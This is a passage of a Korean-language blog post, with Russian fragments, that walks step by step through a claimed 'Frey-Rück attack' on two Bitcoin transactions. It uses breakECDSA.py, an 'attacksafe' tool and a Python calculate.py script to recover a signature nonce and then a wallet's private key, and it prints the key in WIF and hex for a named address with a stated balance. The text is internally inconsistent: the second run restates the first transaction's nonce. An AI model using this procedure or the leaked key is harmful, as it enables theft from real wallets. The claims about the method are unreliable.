https://btc1.trezor.io/tx/c393f6b4651ac109cf90476bab878df624a1867c616a8cd69d0710e7676cd6d4
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":858} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-20-1024x93.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-858"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 0100000001994710097c3901265cc9a6d9efb9d1d3135ef86b627e345e10590455d8c532b9150000006b483045022062786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143022100b0f6a7a99e2fa826507b7645f1c0d67213db699b2c2bb3df438b820e4c53a75a01210205ea35089d57f0282fab836217e5a702d8fa528cef078d60f523fec2ca9c2f50ffffffff010000000000000000046a02445300000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>이제 모든 취약한 트랜잭션에서 모든 R, S, Z 값을 가져와야 합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>breakECDSA.py 스크립트를 사용해봅시다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001994710097c3901265cc9a6d9efb9d1d3135ef86b627e345e10590455d8c532b9150000006b483045022062786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143022100b0f6a7a99e2fa826507b7645f1c0d67213db699b2c2bb3df438b820e4c53a75a01210205ea35089d57f0282fab836217e5a702d8fa528cef078d60f523fec2ca9c2f50ffffffff010000000000000000046a02445300000000
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1020} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-65-1024x256.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1020"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x62786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143
S = 0xb0f6a7a99e2fa826507b7645f1c0d67213db699b2c2bb3df438b820e4c53a75a
Z = 0xd423dca052d4c5b84cf9b847a0fb9ad192cb131da70e6b3770e6444e4b8e06d0</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>취약한 ECDSA 서명 트랜잭션에서 비밀 키를 얻기 위해 데이터를&nbsp;<code>RawTX</code>텍스트 문서에 추가하고 파일로 저장해 봅시다.<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>0100000001994710097c3901265cc9a6d9efb9d1d3135ef86b627e345e10590455d8c532b9150000006b483045022062786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143022100b0f6a7a99e2fa826507b7645f1c0d67213db699b2c2bb3df438b820e4c53a75a01210205ea35089d57f0282fab836217e5a702d8fa528cef078d60f523fec2ca9c2f50ffffffff010000000000000000046a02445300000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool frey_ruck_attack</code>소프트웨어를 사용하여&nbsp;실행<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1022} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-66-1024x306.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1022"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>우리는 이 공격을 시작했고&nbsp;<code>-tool frey_ruck_attack</code>그 결과는 파일에 저장되었습니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 성공적인 결과를 보려면 파일을 엽니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1024} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-67-1024x462.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1024"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xf228f3857bd39809d8de6ba8eeb4f21d2d7acc6156a972cd9a2baaa9f8f6a7ce

RawTX = 0100000001994710097c3901265cc9a6d9efb9d1d3135ef86b627e345e10590455d8c532b9150000006b483045022062786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143022100b0f6a7a99e2fa826507b7645f1c0d67213db699b2c2bb3df438b820e4c53a75a01210205ea35089d57f0282fab836217e5a702d8fa528cef078d60f523fec2ca9c2f50ffffffff010000000000000000046a02445300000000</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>"Deployments ECDSA"</code>우리는 비트코인 ​​블록체인 트랜잭션의 치명적인 취약점을 의미하는&nbsp;비문을 봅니다 .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey значение в формате HEX, это и есть наш секретный ключ "K" (NONCE):</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xf228f3857bd39809d8de6ba8eeb4f21d2d7acc6156a972cd9a2baaa9f8f6a7ce</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>파이썬</em>&nbsp;스크립트&nbsp;로 확인하자<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>ECPy</strong></a>&nbsp;타원 곡선 라이브러리를 사용해 봅시다&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 다음을 지정하여 스크립트를 실행해 보겠습니다&nbsp;<code>секретный ключ "K" (NONCE)</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 point2gen.py 0xf228f3857bd39809d8de6ba8eeb4f21d2d7acc6156a972cd9a2baaa9f8f6a7ce</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1027} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-68-1024x93.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1027"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>(0x62786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143 , 0xe9c10b0f39c777469072719ca1981197061d58b4cbf354d60a0ebb63d5bf6125)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>시그니처 값으로&nbsp;포인트 좌표 확인<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x62786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143
S = 0xb0f6a7a99e2fa826507b7645f1c0d67213db699b2c2bb3df438b820e4c53a75a
Z = 0xd423dca052d4c5b84cf9b847a0fb9ad192cb131da70e6b3770e6444e4b8e06d0</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R          =    0x62786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143
point2gen  =   (0x62786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143 , 0xe9c10b0f39c777469072719ca1981197061d58b4cbf354d60a0ebb63d5bf6125)
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>ВСЕ ВЕРНО!</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xf228f3857bd39809d8de6ba8eeb4f21d2d7acc6156a972cd9a2baaa9f8f6a7ce</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 비밀 키를 알고 있으므로 비트코인 ​​지갑에 대한 개인 키를 얻을 수 있습니다.<code>16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>Python</em>&nbsp;스크립트를 사용합시다&nbsp;&nbsp;.&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; 개인 키 가져오기</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>코드를 열고 서명의 모든 값을 추가합시다<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xf228f3857bd39809d8de6ba8eeb4f21d2d7acc6156a972cd9a2baaa9f8f6a7ce
R = 0x62786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143
S = 0xb0f6a7a99e2fa826507b7645f1c0d67213db699b2c2bb3df438b820e4c53a75a
Z = 0xd423dca052d4c5b84cf9b847a0fb9ad192cb131da70e6b3770e6444e4b8e06d0


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>스크립트는 다음 공식을 사용하여 개인 키를 계산합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>스크립트를 실행해 봅시다:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1028} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-69.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1028"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>PrivKey = 4dc65ac1c7863c8a7a868f369b7a37ec1918d429fff3afbc97fcdf4b454fbfe1</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress를</a></strong>&nbsp;열고&nbsp;다음을 확인합니다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2
WIF:  KyptrwaRhaF7VCwnWo2FDMoRCj9KGvoESDGmxtRk7b65csxaU2aM
HEX:  4dc65ac1c7863c8a7a868f369b7a37ec1918d429fff3afbc97fcdf4b454fbfe1</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":864} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/a3.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-864"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Приватный ключ найден!</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":867,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-21-1024x459.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-867"/></a><figcaption class="wp-element-caption"><strong><a href="https://www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener">www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</a></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>BALANCE: $ 711.91</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>BTC 코인을 잃을 수 있는 잠재적인 위협은 비트코인 ​​블록체인 트랜잭션의 치명적인 취약점에 있기 때문에 모든 사람이 항상 소프트웨어를 업데이트하고 검증된 장치만 사용할 것을 강력히 권장합니다.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>자세한 암호 분석을 통해 동일한 비트코인 ​​주소에 대해&nbsp;<strong><a href="https://btc1.trezor.io/tx/989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6" target="_blank" rel="noreferrer noopener">989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6</a></strong>&nbsp;에서 치명적인 취약점도 발견했습니다.<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>공격을 위한 RawTX 준비</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener">16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":851} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-19-1024x95.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-851"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 0100000001a48220a0fcc53f187abaaed77e1fb6e3fe870f2f77ecc26baf6ae2bb1cbbb3b2070000006b483045022015662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238022100c3f838aca7d8a74904f341dd2394616e72f470cfd371fb52d30da146606c2c3001210205ea35089d57f0282fab836217e5a702d8fa528cef078d60f523fec2ca9c2f50ffffffff010000000000000000046a02445300000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>이제 모든 취약한 트랜잭션에서 모든 R, S, Z 값을 가져와야 합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>breakECDSA.py 스크립트를 사용해봅시다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001a48220a0fcc53f187abaaed77e1fb6e3fe870f2f77ecc26baf6ae2bb1cbbb3b2070000006b483045022015662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238022100c3f838aca7d8a74904f341dd2394616e72f470cfd371fb52d30da146606c2c3001210205ea35089d57f0282fab836217e5a702d8fa528cef078d60f523fec2ca9c2f50ffffffff010000000000000000046a02445300000000
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1030} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-70-1024x268.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1030"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x15662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238
S = 0xc3f838aca7d8a74904f341dd2394616e72f470cfd371fb52d30da146606c2c30
Z = 0x560177d0444e4271e144501d614bc8f564f320196b2c7c47922e7f8e6664d0bc</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>취약한 ECDSA 서명 트랜잭션에서 비밀 키를 얻기 위해 데이터를&nbsp;<code>RawTX</code>텍스트 문서에 추가하고 파일로 저장해 봅시다.<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>0100000001a48220a0fcc53f187abaaed77e1fb6e3fe870f2f77ecc26baf6ae2bb1cbbb3b2070000006b483045022015662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238022100c3f838aca7d8a74904f341dd2394616e72f470cfd371fb52d30da146606c2c3001210205ea35089d57f0282fab836217e5a702d8fa528cef078d60f523fec2ca9c2f50ffffffff010000000000000000046a02445300000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool frey_ruck_attack</code>소프트웨어를 사용하여&nbsp;실행<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1033} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-71-1024x312.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1033"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>우리는 이 공격을 시작했고&nbsp;<code>-tool frey_ruck_attack</code>그 결과는 파일에 저장되었습니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 성공적인 결과를 보려면 파일을 엽니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1035} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-72-1024x454.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1035"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x58d6e63d9240827078edf802e475bb04cd889e7308e409623b1dc92e61e4fd55

RawTX = 0100000001a48220a0fcc53f187abaaed77e1fb6e3fe870f2f77ecc26baf6ae2bb1cbbb3b2070000006b483045022015662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238022100c3f838aca7d8a74904f341dd2394616e72f470cfd371fb52d30da146606c2c3001210205ea35089d57f0282fab836217e5a702d8fa528cef078d60f523fec2ca9c2f50ffffffff010000000000000000046a02445300000000</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>"Deployments ECDSA"</code>우리는 비트코인 ​​블록체인 트랜잭션의 치명적인 취약점을 의미하는&nbsp;비문을 봅니다 .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey значение в формате HEX, это и есть наш секретный ключ "K" (NONCE):</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xf228f3857bd39809d8de6ba8eeb4f21d2d7acc6156a972cd9a2baaa9f8f6a7ce</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>파이썬</em>&nbsp;스크립트&nbsp;로 확인하자<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>ECPy</strong></a>&nbsp;타원 곡선 라이브러리를 사용해 봅시다&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 다음을 지정하여 스크립트를 실행해 보겠습니다&nbsp;<code>секретный ключ "K" (NONCE)</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 point2gen.py 0x58d6e63d9240827078edf802e475bb04cd889e7308e409623b1dc92e61e4fd55</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1039} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-73-1024x94.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1039"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>(0x15662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238 , 0xfc2f3b91b19091745fb29d48725f1060ce4924624b01ff57f14b683430822c8a)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>시그니처 값으로&nbsp;포인트 좌표 확인<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x15662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238
S = 0xc3f838aca7d8a74904f341dd2394616e72f470cfd371fb52d30da146606c2c30
Z = 0x560177d0444e4271e144501d614bc8f564f320196b2c7c47922e7f8e6664d0bc</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R          =    0x15662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238
point2gen  =   (0x15662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238 , 0xfc2f3b91b19091745fb29d48725f1060ce4924624b01ff57f14b683430822c8a)</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>ВСЕ ВЕРНО!</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0x58d6e63d9240827078edf802e475bb04cd889e7308e409623b1dc92e61e4fd55</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 비밀 키를 알고 있으므로 비트코인 ​​지갑에 대한 개인 키를 얻을 수 있습니다.<code>16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>Python</em>&nbsp;스크립트를 사용합시다&nbsp;&nbsp;.&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; 개인 키 가져오기</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>코드를 열고 서명의 모든 값을 추가합시다<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x58d6e63d9240827078edf802e475bb04cd889e7308e409623b1dc92e61e4fd55
R = 0x15662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238
S = 0xc3f838aca7d8a74904f341dd2394616e72f470cfd371fb52d30da146606c2c30
Z = 0x560177d0444e4271e144501d614bc8f564f320196b2c7c47922e7f8e6664d0bc


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>스크립트는 다음 공식을 사용하여 개인 키를 계산합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>스크립트를 실행해 봅시다:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1043} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-74.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1043"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>PrivKey = 4dc65ac1c7863c8a7a868f369b7a37ec1918d429fff3afbc97fcdf4b454fbfe1</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress를</a></strong>&nbsp;열고&nbsp;다음을 확인합니다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2
WIF:  KyptrwaRhaF7VCwnWo2FDMoRCj9KGvoESDGmxtRk7b65csxaU2aM
HEX:  4dc65ac1c7863c8a7a868f369b7a37ec1918d429fff3afbc97fcdf4b454fbfe1</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":864} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/a3.png" alt="DDD" class="wp-image-864"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Приватный ключ найден!</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":867,"linkDestination":"custom"} -->
